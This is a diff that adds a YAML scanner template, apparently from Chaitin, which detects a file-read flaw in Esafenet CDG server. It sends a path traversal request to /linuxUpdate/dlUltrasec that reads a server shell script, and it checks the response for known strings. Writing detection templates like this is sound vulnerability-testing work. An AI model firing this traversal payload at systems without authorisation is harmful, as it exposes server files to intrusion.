@@ -1,0 +1,13 @@
+name: poc-yaml-esafenet_cdgserver-dlultrasec-rce
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /linuxUpdate/dlUltrasec?path=../../../../../../../../../esafenet/fileServer/fileServer.sh&type=1
+    expression: response.body_string.contains('fileServer.jar') && response.body_string.contains('/bin/bash')
+expression: r0()
+detail:
+  author: Chaitin
+  links:
+    - https://stack.chaitin.com/vuldb/detail/5e342f19-6c88-4f8f-8373-8fbc88728e51
